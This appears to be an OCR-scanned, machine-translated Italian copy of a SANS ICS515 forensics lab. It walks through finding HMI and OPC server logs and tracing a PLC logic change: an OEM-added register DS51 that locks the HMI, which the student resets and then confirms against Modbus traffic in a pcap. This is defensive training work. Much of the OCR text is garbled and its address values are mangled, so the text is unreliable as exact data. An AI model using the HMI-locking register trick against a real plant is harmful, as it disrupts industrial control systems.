3 {::Clickplc.0:16501} 1 L'interruttore di trasmissione è scattato
4 {::Clickplc.0:16398} 1 Generatore locale non al minimo per l'interruttore
Chiuso

::Clickplc.0:16405}
::Clickplc.0:16592}
::Clickplc.0:16692}
:Clickplc.0:16428}

L'interruttore di generazione è scattato
Allarme critico per area residenziale
Allarme critico per area industriale
Allarme critico valvola carburante

ora
ao
PRPRPP

> Utilizzando i messaggi di allarme visualizzati nell'HMI e nel Visualizzatore file, identificare le mappature tra
la colonna TriglDx nel Visualizzatore file e la colonna Messaggio nella tabella fornita dal tecnico.

Attività: registri delle applicazioni ICS per la medicina legale

1. Identificare i registri dell'applicazione HMI.
> Avviare l'HMI ma eseguire la finestra seguente PRIMA di selezionare "Esegui applicazione".
> Fai clic su "Impostazioni terminale"

FactoryTalk View ME Station [Limite di 2 ore] - 10.00,00.290(Patch 03)

Applicazione attuale:

1CS515V1.mer

Carica applicazione Esegui applicazione Impostazioni applicazione
SE3]

Elimina file di ritardo
Prima di correre
IFS)

Impostazioni del terminale
SE]

© 2021, Robert M. Lee Lab 4.1-6

un aN

9?@meenmemnenenmnenh»mnnnnn *® ® ©

uv

"? ?, ?
Se FTF WY WT WT WY Ww WD ee we ww

ry

TY

> Aprire "Configurazione diagnostica" dal menu delle impostazioni del terminale.

> Fai clic su "Sì" per consentire all'app di apportare modifiche.> Vai a "Configurazione diagnostica" -> "Configurazione destinazione" -> "Registro locale"

oH Impostazione diagnostica

Configurazione della diagnostica Configurazione della destinazione del registro locale
- Impostazione della destinazione

FT Visualizza elenco diagnostica
FT Visualizza ME traccia di controllo
Mt Ccal Log

Database ODBC eee RES AE nes Lat
i» Instradamento messaggi pS Sy Vedere ee

Dimensione massima del registro: [25600 = KB

Quando viene raggiunta la dimensione massima del registro:
@ Eventi Overmrite secondo necessità
(Archivia il registro quando è pieno

© Non sovrascrivere gli eventi
(cancella il registro manualmente}

Cancella registro |

~ Percorso di registrazione

Vinevt,Logs\FT Diag.evts

Annulla Applica Guida

*Nota* I fornitori di software HMI possono archiviare i registri in modo diverso, tuttavia, questo HMI utilizza gli eventi di Windows come file
posizione per questi registri. Inoltre, quando si identificano le posizioni dei registri, prendere nota della "Dimensione massima dei registri".

e altre impostazioni che potrebbero essere utili per la pianificazione forense.

> Annullare la finestra "Configurazione diagnostica".
> Chiudi "Impostazioni terminale".
> Eseguire l'applicazione.

2. Esplorazione dei registri HMI.
> Apri Visualizzatore eventi di Windows.

Migliore abbinamento

H'| Visualizzatore eventi
Applicazione desktop

Comando

@eventvwr

Tutte le app Documenti Impostazioni Web

Saaablied

Più Volkswagen

Vv

> Passare a "Registri applicazioni e servizi" -> "Diagnostica FactoryTalk"
> Percorri i registri prendendo nota dell'avvio e dell'arresto dei vari servizi.

3. Identificare i registri del server OPC.

© 2021, Robert M. Lee

Laboratorio 4.1-7
> Aprire l'analizzatore MatrikonOPC.

Procedura guidata per la licenza

Analizzatore MatrikonOPC

eee

Manuale utente dell'analizzatore MatrikonOPC

MatrikonOPC Explorer

> Assicurati che tutte le caselle siano state selezionate e seleziona Desktop come "Percorso di output".

> Fare clic su Esegui.

® Analizzatore MatrikonOPC

{¥ Informazioni di sistema |¥ File di registro | mg

|¥ File di configurazione [¥ pcom Esci

\ File di output compressi

[¥ Cambia percorso di output della directory _...
C: \Utenti\sansics\Desktop| IO

@MatrikonOPC

> Una volta completata l'operazione, "Esci" dall'utilità e apri il desktop.

> Una nuova cartella e un file zip compresso che condividono lo stesso nome a partire da anno-mese-giorno

dovrebbe essere presente sul desktop.
>Apri la cartella.

*Nota* A differenza del fornitore HMI, questo fornitore OPC sceglie di fornire uno strumento di raccolta (probabilmente per la risoluzione dei problemi
scopi) che estrae alcune informazioni utili non solo sul software ma anche sulla configurazione dell'host.

> Apri ciascuno dei file "TXT" e prendi nota del loro contenuto. Alcuni contengono percorsi più utili

file e registri di configurazione.

> Apri e rivedi il file "DCOMInfo.txt". Come server OPC DA, il processo di installazione di questo
il software ha configurato DCOM su questo host per CONSENTIRE A TUTTI di accedere a questi servizi.

(eB) @) qe) @) qe) () ce) @) ee) (@) (ey) cB) (B)

)

(B) @) @) @) .

'B)

> Apri "ConfigFileInfo.txt"

> Guarda all'interno del file zip e apri il file "Modbus_DefaultConfig.xml" in un browser. Questo è il
configurazione effettiva in esecuzione del server OPC. Puoi anche visualizzare
"Modbus_ModbusImportConfigurationSchema.xml" per comprendere la configurazione OPC

> Apri "LogFileInfo.txt". I percorsi elencati sono i percorsi dei registri dell'applicazione effettivi.

> Apri il file "Common_PSTCFGMatrikon.OPC.Simulation.1" nel blocco note.

> Prendere nota della data/ora dell'ultima immissione, chiudere il file e chiudere l'applicazione HMI.

> Riaprire il file e prendere nota delle nuove voci.

© 2021, Robert M. Lee Lab 4.1-8

@@

'B)

'Noi
“Mons

COME

a3

*Nota* Questo registro acquisisce il nome del computer da cui è stata connessa e disconnessa la connessione
da. Poiché il numero di computer client è in genere piccolo e noto, questo potrebbe essere un identificatore molto utile
da dove ha avuto origine una connessione non autorizzata.

Esercizi da asporto

Per sfruttare i dati storici del sistema ed elaborare i registri eventi delle applicazioni dati che sono
a disposizione dei difensori del sistema, è necessario prima capire come appaiono tradizionalmente questi set di dati.

© 2021, Robert M. Lee Lab 4.1-9
wo ®© wo O8 WwW |W ww weeweeeewew

oo oO YD wD YD W

AY

_Lab 4.2 -Analisi Logica e Reset

Obiettivi
e Identificare cosa c'era di sbagliato nella logica e ripristinare il sistema in uno stato buono
e Determinare quando la manipolazione logica ha provocato per la prima volta una manipolazione nell'HMI

*Informazioni sullo scenario* L'HMI C3PO è stato bloccato inaspettatamente dopo la modifica della logica dell'OEM al clic
PLC. A prima vista questo non ha senso perché ciò implicherebbe che una modifica del PLC abbia un impatto sull'HMI
negativamente, ma è lo scenario più realistico visti i recenti cambiamenti. Pertanto, dobbiamo analizzare la logica
e i dati di rete disponibili per determinare l'analisi della causa principale.

Questa è la continuazione dell'esercizio 3.5 e utilizzerà il kit Windows VM e PLC. L'ultima parte del laboratorio sarà
utilizzare Lockedhmi. pcap nella VM RELICS.

[Domande :

1. Qual è il valore del registro della logica modificata?

2. Qual è il valore del Registro?

3. Qual è il valore HEX per cercare le risposte nel pcap con il registro 50?

4. Qual è il primo pacchetto in cui avviene la scrittura in questa sessione e a che ora?

© 2021, Robert M. Lee Lab 4.2-1
Attività ~ Determinare in quale punto del codice PLC viene comandato l'HMI:

1.Qual è il valore del registro della logica modificata DS51

*Nota* Dobbiamo scoprire perché l'HMI si sta bloccando; la spiegazione logica è qualcosa nell'HMI
ma l’unica cosa che è cambiata di recente è il nuovo codice PLC dell’OEM e quindi inizieremo da lì.

*Nota* Il software Click non supporta la funzione di confronto dei programmi (alcuni fornitori ne sono dotati), ma la supporta
supporta l'esportazione degli indirizzi Modbus utilizzati. Possiamo confrontare le due esportazioni e vedere se

possiamo individuare una differenza.

> Utilizzando Notepad++ con il plugin di confronto installato, confronta il file PLC originale con quello nuovo

@

«

Codice fornito dall'OEM.
> Apri Blocco note++

[Di nuovo 1 - Blocco note++

File Modifica Cerca Visualizza Codifica Impostazioni lingua Strumenti Macro Esegui finestra plugin ? X
SSH mare «eH acl|aylae& 2 VEDBA aS SPH RBSERer«+ eB
oi

E? |

Ln:1 Col:1 Pos:1 Windows (CRLF) UTF-8 INS

Lunghezza normale del file di testo 0 denti: 1

Aprire sia il file ICS515 OEM Change V2_Modbus_Addresses.csv che il test di accettazione del sito ICS515

V1_Indirizzi_Modbus.csv
> Aprire la cartella ics515 sul desktop della VM Windows
> Una volta aperti entrambi i file, vedrai entrambi i file apparire in due schede separate

© 2021, Robert M. Lee Lab 4.2-2

ed ~~ Chel oo, ra (; .; @ff ? (; Co

UN
File Modifica Cerca Visualizza Codifica Impostazioni lingua Strumenti Macro Esegui finestra plugin ?
Nuovo
Aprire...
Apri la cartella contenente
Apri nel visualizzatore predefinito
Apri cartella come area di lavoro...

wT wT WY &

Taglia+R
Ctri+S
Ctrl+Alt+S

w

Ctrl+Maiusc+S

CTRL+W
Ctrl+Maiusc+W

{Af CAUsers\ics612" Dropbox\SANS ICS\Courseware\ICS515\Click\ICS515V10 Modifica OEM per schede di produzione Modbus_Addresses.csv - Blocco note++

File Modifica Ricerca Visualizza Codifica Impostazioni lingua ry Macro Esegui finestra plugin ?
1G SS Gal 4 RID Cia ie 2 BEDI EaABA Pe RB ORB x + ~ = G

GF f71CS515V10 Cambio OEM per schede di produzione Indirizzi Modbus cav £3

indirizzo, tipo di dati, indirizzo Nodbus, codice funzione, nickname, valore iniziale, ritentivo, commento indirizzo
XO01,BIT, 100001, "8C=02","Gen_ Interruttore aperto_PA",0,No, “Generazione interruttore quadro aperto PB!
X002,BIT, 100002, "FC=02", "Chiusura interruttore generale PB", "Chiusura interruttore centrale di generazione PB"
X003,BIT, 100003, "Fc=02", "Interruttore trasmissione_Aperto_PB",0,No, "Interruttore trasmissione aperto PB”
X004, BIT, 100004, "FC=02", "Chiusura interruttore trasmissione PB",0,No, "Chiusura interruttore trasmissione PB"
%101, BIT, 100033, *FC=02", "Trans _Prot_Rly_Fault_fB",0,No, “Errore relè di protezione trasmissione PB"
X102, BIT, 100034, *FC=02", “Trans Prot_Rly Clear P8*,0,No, “trasmissione relè di protezione Clear Fauit FB"
X163, BIT, 100035, *FC=02", “Dist_Res_CktReCls_opn_PB",0,No, “Richiusura circuito di distribuzione aperto FB"
X104, BIT, 100036, *FC=02", "Dist Res CktReCls Cls PB", 0,No, "Distribution Circuit Reclosure Close PB"
X202, BIT, 100066, "FC=02", "SIM2*, 0,No, "Stagionale O=Classificazione invernale ; 1=Valutazione estiva"
X203, BIT, 100067, "FC=02", "SIM3",0,No,"Intertie: O=Nessuna risorsa di generazione esterna; l=Risorse di generazione esterna disponibili:
X204, BIT, 100068, "FC=02", "SIM4", 0,No, "Reset generazione allarmi”
X205,BIT, 100069, *FC=02", "SIMS", 0,No, "Reimposta allarmi di trasmissione*
%206,BIT, 100070, *Fcm02", "SIME", 0,No, "Reset Allarmi Residenziali Distribuzione"
X207, BIT, 100071, "FC=02", "SIM7",0,No,"Reset Allarmi Industriali Distribuzione*
X208, BIT, 100072, "FC=02", "SIME", 0,No, "Modalità esperto= La generazione locale deve essere >= al valore minimo per la chiusura dell'interruttore && L'interruttore HMI industriale è
YOOL, BIT, #193, "FO=0i, 05, 15", "Protect Rly Reset_Light",0,No, "Spia guasto relè di protezione"
¥002, BIT, £194, "FC=01,05, 15*,"Trns_Brkr_Closed_Light",0,No, “Spia interruttore di trasmissione aperto”
1003, BIT, 8195, "FC=01, 05,15", "Gen Brkr_Closed_Light",0,No, "Generation Breaker Open Light"
Y004, BIT, 5196, *FC=01,05, 15", “Spia di chiusura interconnessione",0,No, "Spia di stato interconnessione: una, solo alimentazione locale; 1 = Rossa, alimentazione esterna
Y101, BIT, 8225, "FC#01, 05, 15", "Dist_Res_Load0To100",0,No, "Distribuzione uscita carico residenziale Light61 (9-1008)"
¥102, BIT, 8226, "£C=01, 05,15", “Dist _Res_Load33To100",6,No, “Uscita carico distributivoresidenziale Light02 (33-1008)"
¥103, BIT, 8227, "FC=01,05, 15", "Dist_Res_Load6éTo100",0,No, "Distribuzione Carico Residenziale Uscita Lightd3 (66-1001)"
¥104, BIT, 9228, "FC=01,05,15","Dist_Ind_ Power Avail",0,No, “Alimentazione di fabbrica disponibile (giallo)*
¥105, BIT, 8229, "FC=01, 0S, 15", "Dist_Res_Reclsr. ed", 0,No, "Distribuzione Residenziale Richiusura chiusa (non fisica)”
Ci, BIT, 16385, "FC#01, 05,15", *"Gen_State Idle*,0,No, "Generazione Stato inattivo"
C2, BIT, 1636, "FC=01, 05,15", "Gen State Genera", 0,No, “Generazione Stato Genera”
©3, BIT, 16387, "FC=01, 05,15", "Gen_State Alarm", 0,No, "Generation State Alarm”
CE, BIT, 16390, "FC=01,05,15", "Gen Start _Gen_PB_HMI*,0,No, "Generazione Avvio Generatore PB HMI"
CT, BIT, 16391, "FC=01, 05,15", "Gen_Stop_Gen_PB_HMI",0,No, "Generazione Arresto Generatore 2B HM"
C8, BIT, 16392, "FC=01, 05,15", "Gen Generator Permissive", 0,No, "Generatore avviato area di generazione"

PERCHÉ noi ww

sì

«sì.»

[Lunghezza normale del file di testo: 18.342 righe: 182 ta:1 Col:1 Post Windows (CRLF) _UTE-8 INS

> Utilizzando il menu Plugin, seleziona il menu a tendina Confronta e fai clic su Confronta
> Identificare i cambiamenti

wp “ep 4B”

4p'

© 2021, Robert M. Lee Lab 4.2-3

UN
[Dy Causers\tes612)\Dropbox\SANS ICS\Courseware\IC$515\Click\ICS515V10 for Production Boards Modbus_Addresses.csv - Notepad++ [Amministratore]
File Modifica Cerca Visualizza Codifica Impostazioni lingua Strumenti Macro Esegui finestra plugin?

s8H&s

2Q\ 4h) Scia%e/ 22 Ba

325, BIT, 16705, "!

01,05, 15",
27, BIT, 16711, "FO=01, 05,15"
0328, BIT, 16712, *FCH01, 05, 15". "1

C329, BIT, 16713, °F
330 €/BIT, 1€714, *FC=01, 05, 15*, spit

€ 335, BIT, 16719,

'13, BIT, 145059, “FC
T10, BIT, 145066, "FC#02", "Gen_Carburante_|

T15,BIT, 145071,"

DS1, INT, 400001, *FC=03,

ps4, INT, 490004
DSS, INT, 40
DS€,INT, 400006, "FCH03,06,16",*

FC#03,06,

712, BIT, 145068, "FC=02", "Gen_Fuel_Ramp_Watchdog"
ce02", "Timer Coma Watch Dog", 0,No, “Visualizzazione comunicazioni
be2,Brr, 161442, *Fo=02","_1st_SCAN", 0,No, ""

16", "Generazione esterna MW max",
DS2, INT, 400002, "FC=03, 06,16", "Gen_Generator_Max_Pw1
DS3, INT, 400003, "FC=03, 06,16", "Gen _Bar Graph Out Cal

{=IICS515V10 per Production Boards_Modbus Addresses csv £9 VpaeSetsviniein crs

S*, *Eurnace2
326, BIT, 16710, "FC=01, 05,15", “Forno2_Off HMI", (
'"Digt_Ind_BrkE_opn_t

6331, BIT, 16715, “FC=01, 05, 15", "Dist_Ind Brkr_Close Pex", 0,No, *Distributi
C332, BIT, 16716, *FC=01, 05, 15", "Dist_ind_Brkr_Closed",0,No, "Distribuzione Ii
€334, BIT, 16718, "FC=01, 05,15", "Dist_Ind_Open_Brkr_HMI",0,No, "Distribuzione |)
."ECH01, 0S, 15", “Dist_Ind_ Chiudi Brkr_HMI",0,No, "Distribuzione
12, BIT, 14506, "FC=02", “Gen_Ramp_Up To, Lo
2", "Gen Rampa giù a_L

carico", 0,No,

generazione
Gene della rampa di generazione
jalve Rampa, Sim", 0,No, "Generazione locale
No, "Generazione Fuel Ra

0, sì, "Generazione max
0, sì, "Generazione L.
0,Sì,"Valore di output calcolato del grafico a barre di generazione"

", "Valore uscita generatore generazione", 0,Sì, "Valore uscita generatore generazione"

“FC=03, 06,16", “Gen_Genertr_} 0

n_Totale_Richiesto.! Pwr, 0,Sì, "Potenza richiesta totale della generazione®

Imposta come primo da confrontare

Cancella confronto attivo

CirheAlteShittex

Cancella tutti i confronti
Differenza dall'ultimo salvataggio
SVN Dit

Vai Ditt

ignora gli spazi
Rileva mosse
Barra di navigazione
Precedente AitePagina su
Successivo Arti Pa

Primo rere

Ctrl+AiteD
Criiaitey
CtrteAlteS

Generi di rampa

Ultima cittàAltePagina giù

Impostazioni
Di_

s, "Setpoint di chiusura interruttore minimo generatore di generazione Ma"

DS?, INT, 400007, "FC=03, 06, 16", “Gen_Total Available Pwr*,0, Sì, "Potenza totale disponibile generazione"
DS8, INT, 400008, *FC=03,06, 16", "Gen Total Loc] _MM_S®", 0, Sì

D$, INT, 400009, "

C=03, 06,16", "Gen Totale Bxt_Nw_SP*,

Setpoint di uscita MW locale di generazione*

Setpoint uscita Mw esterna generazione*

DS10, INT, 490010, "FC=03, 06,16", "Gen_Local_Manual_Out_sP",0,¥es, "Uscita manuale locale di generazione quando AVR è spento"
DS11, INT, 400011, "FC=03, 06,16", “Gen_CT_Fuel_Valve Man_SP",0,¥es,"Setpoint manuale valvola carburante turbina a combustione di generazione*

DS12, INT, 400012, “FC=02, 06, 16", "Gen_CT Fuel _Valve_out®, 0, ¥
DS13, INT, 400013, "FC#03, 06,16", "Gen_CT Carburante Viv _Auto_Rem*
DS14, INT, 400014, "FC=02, 06,16", "Gen Puel_Valve_3P CV Err", 0, Sì, "Generazione Turbina di Combustione
INT, 400015, "EC#03, 06,16", "Gen CT Fuel viv Min Font", 0, Sì, "Generazione di turbine a combustione

DS15,

0,¥es,"Generazione di turbine a combustione

;*Uscita valvola carburante turbina a combustione di generazione "

Uscita valvola carburante Modalità automatica Remota"
Errore posizione valvola carburante {Setpoint - Attuale
Percentuale di uscita minima della valvola del carburante” “

angi: 1240 linee: 180

Ln: 133 Coli 1 Pos: 13.348

Finestre (CRLF

UTF-8

*Nota* Verrà visualizzato un confronto affiancato di entrambi i file CSV. Scorrendo le differenze,

vedrai un timer RemoteHMIDelay e un tag RemoteHMI DS51 del registro di memoria.

LY causers\tes812"\Dropbox\ SANS ICS\Courseware\ICS515\Click\ICS515¥10 fr Production Boards_Modbus_Addresses.csv - Notepad++

File Andatura Ricerca Visualizza Codifica Impostazioni lingua Strumenti Macro Esegui finestra plugin ?
"UN

sG8He euSlid whi 2c aa

{R}1CS515V 10 per Schede di Produzione_Modbus_ Indirizzi cov EF

ata

2 4)

jm gi\DReGs.v ee

+ [G)e8518110 08M Cambia fr Schede di produzione Modbus Adcrossen cov El |

(C325, BIT, 16709, "FC=01, 05, 18", "Fornace?
£926, BIT, 16710, "Fc=01, 05, 15", "Fornace?
C327, BIT, 16711, "PC=01,05,

329, BIT, 16713, "FC=01, 05, 15", "Di
330, BIT, 16714, *FC=01,05, 15", "Dis
€ 331,81 trilioni,
SaarTait evie, sOLL0S, ist,
€334,BIT, 16718, "FC#01,05, 15'
6335, BIT, 16719
T2, BIT, 145058,"

Ind
Ind

715, BIT, 145071, "FC=02", "Comm | Watch Dog"
x4}

DS3, INT, 400003, "FC=03,
elias tonspicatrsepng 16", "Gen_Gene:

1 INT, 400005, “FC=03, 06, 16", "Gen_Gene:
DS, INT, 400006, "FCH03, 06, 16", "Gen-Tota

DS7, INT, 400007, "EC#03, 06, 16", "Gen Totale pw disponibile
DSB, INT, 490008, "FC=03, 06,16", "Gen_Total_Loc]_MW_SP™,
16", "Gen Totale _Ext_Mw Se", 0
*Geh_Local_manual_out_
3,06,16", "Gen CT_Valvola carburante Man | | 146
400012, "FO=03,06, 16%, "Gen_CT Uscita valvola carburante |i} 147
Cx03, 06,16", "Gen CT Carburante viv auto [|i4e
Fo=03, 06, 16", "Gen Valvola Carburante Sp cv || 145

DSY, INT, 400009, "EC=03, 0
S10, INT, 400010, "FO=03,
j& | DS11, INT, 400011, "FC!
7 0812,
8 (S13,INT,400023,
DS14,INT,400024

16

15", "Dist ind 4
¢328,81T, 16712, "FC=01,05, 18", "Dist Ind!

ne
“EC=01, 05, 15", "Dist_Ind_<¢
02", "Gen Ramp Up_To Load", 0,No,*Ge | |128
13, BIT, 145059, "FC=02", “Gen_Ramp_Down_To_Load", 0, No,"

T10, BIT, 145066, "FO=02", "Gen_Fuel_Valve_i
712, BIT, 145068, "FC=02", "Gen_Fuel_Ramp_Watchdog", 0,No

SC2,BIT, 161442, "FC=02","_1st_SCAN",0,No, ""
DS1, INT, 400001, "FC=03, 06, 16", "Gen_External_MW_Max",0
DS2, INT, 400002, “FC=03, 06, 16", "Gen Generator Max Pwr*
6, 16","Gen_Bar_ Grafico fuori |

y-On_HME*, 0,80, «| [lle
"OfF_HMI",0,No
| Brkr_Opn_Init
Brkt,

Brkr,
Brkr_Close_In

Apri Brkr_aMz
‘chiudi _Brkz_am || 129

Famp_Sim", 0,8

Temporizzatore", 0,No,"

ale
tor_out_Valu} | 129
cr_Min_Bkt_Cl
_Richiesto_ Pw

>

1

134 @t51,

5,Bit, 16709, "Fc=01, 05, 15", “Forno2_On_ BMI",
326, BIT, 16710, "FC=01, 05, 15", "Forno? Spento HMI", 0,No
€327,BIT, 16711, "FC=01,05, 15", "Dist_Ind Brkr_Opn_Init
6328, BIT, 16712, "FC~01, 05,18", "Dist_Ind_Brkr_Open_zer
6329, BIT, 16723, "FC=03, 05,15", "Dist_Ind_Brkr_Open®, 0,
C330, BIT, 16724, "FC=01,05, 15", “Dist_Ind Brkr_Close_In
€331, BIT, 16715, "FC=01, 05,15", "Dist_Ind Brix,
32, BIT, 16716, "PC#01, 05, 15", Dist. Ind YBrkr “chiuso”,
C334, BIT, 16718, "FC+01, 05,15", “pist_ ind_Open_} Beker, AE
C335, BIT, 16719, "FC=01,05, 1S", "Dist_Ind { Chiudi_Brkr. HM
72, BIT, 145058, "FC=02", "Gen_Ramp_Up_To_Load", 0, No,
73, BIT, 145059, “FC=02", "Rampa di generazione per caricare", 0,No,"
T10,BIT, 145066, "FC=02", "Gen_Valvola_Carburante_Ramp_Sim*,0,N
712, BIT, 145068, "FC=02", "Watchdog Gen_Fuel_Ramp", 0,
T15, BIT, 145071, °FC=02", "Timer watch dog comunicazione”, 0,No,”

*rce2", "Pe

©3258

$C2,BIT, 161442, "FC=02", *_
Dg1, INT, 400001, "FC=03, 06,16", “Gen_External_MW_Max",0
DS2, INT, 490002, *PC=03, 06,16", "Gen Generator Max Pwr"
DS3, INT, 400003, "FC=03, 06, 16", "Gen_Bar_Graph_Out_Calcy
DS4, INT, 490004, "FC#03,06, 16", "Gen _Genérator_out_Valu
DSS, INT, 490005, "EC=03,06, 16", "Gen Genertr_Min_Bkr_Cl
DS6, INT, 400006, "FC=03, 06, 16", "Gen Totale Pw richiesta"
DS7, INT, 400007, *FC=03, 06, 16", "Gen Totale Pw disponibile
DSB, INT, 400008, "FC=03,.06,16%, "Gen Total Locl_MW SP",
DS, INT, 400009, "FC=03, 06, 16", “Gen_Total_Ext_Hw_SP*,0
S10, INT, 400010, *FC=03, 06,16", "Gen_Local_Manual_out_
DS11, INT, 400011, "FC=03, 06,16", "Gen_CT_Fuel_Valve_Man
D912, INT, 400012, "PC#03, 06, 16", "Gen_CT_Puel_Valve_Out
DS13, INT, 400013, "FC=03, 06,16", "Gen CT Puel Viv _Auto_
DS14, INT, 400014, "FC=03, 06,16", "Valvola carburante gen SP CV ¥
ev >

5

lunghezza 18.324 righe: 184

Uns134 Col Pos: 13.370

Windows (CRLF) _UTE-8 INS

*Nota* Questo è il tag in cui lo schermo HMI viene controllato in remoto. Esaminare questo Fare clic sulla memoria del PLC

posizione e assicurarsi che questo valore sia impostato su "0", il che significherebbe che non è possibile controllarlo da remoto

il PLC.

*Rispondi* Registro HMI remoto DS51

© 2021, Robert M. Lee

Laboratorio 4.2-4

e.a

td

pi

sì, Ww

“a w w w wy

noi ww Ww Ww

Qs'

2. Qual è il valore del Registro? 1

> Vai online e determina il valore di DS51

> Nell'attività precedente al passaggio 8, hai scaricato il programma ICS515 per la produzione
Boards.ckp e dovresti essere online con il Click. Se non sei online con il Click PLC,
aprire il progetto ICS515 Site Acceptance Test V1.ckp per avviare il software di programmazione Click
e quindi scrivere il progetto sul PLC.

> Dopo che è avvenuta la scrittura del progetto e si è connessi al PLC, utilizzare la navigazione
sul lato sinistro del software Click, per trovare e fare doppio clic sul visualizzatore "DataView1".
per aprire la finestra DataView

Software di programmazione CLICK (Versione 3.01) - Test di accettazione del sito ICS515 VI.ckp - [Programma principale}
Guida della finestra Monitor,

io Oa WadivessPicker TE) Progetto WayRend.In linea «== Stans
yp Riferimento incrociato Wa Wiite Project 8 Esegui TB dete Visualizza ~
CPU VO Software 5 Controllo sintassi 3 Informazioni PLC C7) Errore PLC

Programma Funzione PLC
©-Ry Programma di subroutine a
Sa BreakerModelli 1
Vedi DistindAlarms
Sì, distinti Stati
Sy Distindustriale
Sy DistResAlarms
Sgy DistResidenziale
Igy DictResstates
§@4 Gen_Fuel_Control
Gy Gendlarms
§Generazione G4
Sl Genstati
gf Indticlize
$y FemoteCommvd
§@y TransAllarmi
La trasmissione Si può
Di Transtetes $ TransStates
§@ Programma di interruzione
@ Selettore indirizzi
GF Modifica commenti rung
4p Informazioni sul programma locale: TransAlarrns
D symax Controllare la trasmissione
Riferimento incrociato Visualizza Teanittates:

8 mira fi 1CS515 Test di accettazione in sede V1 - 0 errori, O avvisi)
Monitoraggio dello stato

Tutto
titolo

HH
FM, consegue

Chiamata,
3; Ney generazione

4_Gen_Fuel_Contro!

tu
5 Senatormi SP

>
ee ee eee ti Ree en anguilla RES ax

Scrivi progetto nel PLC...
"Trasferimento completato."

Vista Tee Tevt

> Nella finestra DataView, scorrere fino alla fine degli indirizzi da testare. Vedrai DS51
e che questo valore è 1. Vogliamo cambiare quel valore in 0 per sbloccare lo schermo HMI.

© 2021, Robert M. Lee Lab 4.2-5
a} Visualizzazione dati -[DataView1] _ x

Modifica = Riempi giù

Visualizza sostituzione

© 2021, Robert M. Lee

> Apparirà una nuova finestra di selezione indirizzo. Nel campo di input Trova, cercare i nuovi valori
che hai scoperto confrontando i file logici: accedi a RemoteHMI e seleziona Trova

& Selettore indirizzo: modalità di ritiro

2

Operazione interruttore...

Gen_

| lo |< [x

38 9as6 |xese lag

~) -Indirizzo utilizzato/non utilizzato~ Fon (1) Visualizza l'indirizzo MODBUS

| @Visualizza sia l'usato che l'inutilizzato | Indirizzamento MODBUS 984
Intero (Parole) | | Op ortà utilizzata Indirizzamento MODBUS HEX
Frammento in virgola mobile: a
rosso © Solo display inutilizzato

Laboratorio 4.2-6

=>

= -—
wo wo Ww wo Ww WD WwW Ww noi ee noi

cioè) Le /_

(S'

va Ww

> Con il nickname e l'indirizzo DS51 dell'HMI remoto evidenziati, selezionare OK per aggiungere questo indirizzo
il tuo campo DataView1

& Selettore indirizzo: modalità di ritiro

Compila (soprannome) Trova: [RemoteHM ~ | Trova corrispondenza esatta

lIndirizzo ai[Tipo di dati [Nickname |usato | Indirizzo Cony

t |RemotoHMI INo

TargetFuelSettin... Sì Target Fu...
Fuel_Valve_Perce... Sì Valvola carburante...

morire

> Con la finestra DataView1 che ora visualizza DS51, seleziona il pulsante Modifica in alto a sinistra, quindi
possiamo manipolare il valore e cambiarlo da a1 a a0

> Per DS51 inserire un Nuovo valore pari a 0 e quindi fare doppio clic sull'immagine di scrittura a destra di
nuovo valore.

Visualizzazione dati Fe -[Visualizzazionedati1] = oO x

Gen_Breaker_Open_FOfF

HMI remota 1 | HMI remota intera

> Dovresti vedere il valore corrente visualizzato cambiare in 0.
> Verificare che l'HMI funzioni ora

*Nota* Hai capito che 1 blocca lo schermo e restituendo quel valore a 0 si fissa la logica del controller.

*Risposta* 1 che blocca lo schermo

© 2021, Robert M. Lee Lab 4.2-7

Compito: convalidare i risultati del protocollo ICS

3. Qual è il valore HEX per cercare le risposte nel pcap con il registro 50? 0x01040032

*Nota* Matrikon sfrutta il sistema decimale e DS51 si tradurrebbe in decimale 50. Pertanto, potremmo
sfruttare l'acquisizione di rete per identificare i comandi di scrittura su DS51. Questo sistema utilizza ModbusTCP che
significa che scriverebbe nel registro (e poiché è decimale 50 per DS51) specificamente nel registro 50.
> Aprilockedhmi.pcap in Wireshark ‘ua
> Apri la VM RELICS
> Aprire la cartella ICS515 situata sul desktop e quindi accedere a c3po > pcaps
> Fare doppio clic sulockedhmi.pcap per aprire il file in Wireshark

*Nota* 192.168.0.8 è l'HMI e 192.168.0.10 è il PLC Click. Cerchiamo il Registro 50 sul Click
PLC per determinare se possiamo vedere i comandi scritti per convalidare la logica. Il registro 50, per DS51, sarebbe
tradurre in 32 in HEX.

*Nota* Ora dobbiamo capire cosa sta succedendo nelle transazioni ModbusTCP; se analizzassimo
ogni pacchetto richiederebbe troppo tempo. Ma possiamo determinare quali codici funzione vengono utilizzati e vedere cosa
potrebbe essere utile (scrive e legge come esempio). Perché sospettiamo che il PLC stia scrivendo sull'HMI e non
viceversa cercheremmo che l'HMI emetta un comando di lettura al PLC. La risposta
avrebbe il valore di scrittura, in modo inappropriato, sull'HMI.

> Identificare i vari codici funzione focalizzati sulla lettura
> Una rapida revisione della sezione "Informazioni" in Wireshark mostrerà un paio di tipi diversi di funzione di lettura
codici
> Campiona la query e le risposte per determinare quale codice funzione ha maggiori probabilità di essere utile

75 Risposta: Trans: 25021; Unità: 1, Funz
66 Domanda: Trans: 25022; Unità: 1, Funes
127 Risposta: Trans: 25022; Unità 2.) Fan:
66 Domanda: Trans: 25023; Unità: 1, Funz: Lettura registri di mantenimento
127 Risposta: Trans: 25023; Unità: 1, Funzione: ing Kegisters
131 Domanda: Trans: 25024; Unità: 1, Funz: 16: Scrittura di più registri
66 Risposta: Trans: 25024; Unità: 1, Funz: 16: Scrittura di più registri
66 Domanda: Trans: 25025; Unità: 1, Funz: Lettura ingressi discreti

75 Risposta: Trans: 25025; Unità: 1, Funz: Lettura ingressi discreti

66 Domanda: Trans: 25426; Unità: 1, Funz: Lettura registri di ingresso

127 Risposta: Trans: 25026; Unità: 1, Funz: Lettura registri di ingresso

66 Domanda: Trans: 25427; Unità: i, Funes legge i registri delle aziende

Leggi ingressi discreti

Leggi i registri di input
Leggi Tnput Reeisters

WwW & &N

ww b fw Ny

127 Risposta: Trans: 25027; Unità: 1, Funz: Lettura registri di mantenimento

*Nota* Ad esempio, la lettura degli ingressi discreti è il codice funzione 2, la lettura dei registri di mantenimento è il codice funzione 3 e
La lettura dei registri di input è il codice funzione 4. È possibile campionare ciascuno di questi per provare a determinare i valori che noi
potrebbe interessargli. Ad esempio sappiamo che stiamo cercando valori relativi a DS51 che sarebbe Register
50. Per determinare quale codice funzione ha valore, dovresti guardare la query e la risposta.

© 2021, Robert M. Lee Lab 4.2-8

DDD Om®

eo @® B® w®

? PRnoonnenoennn nen
Ss)
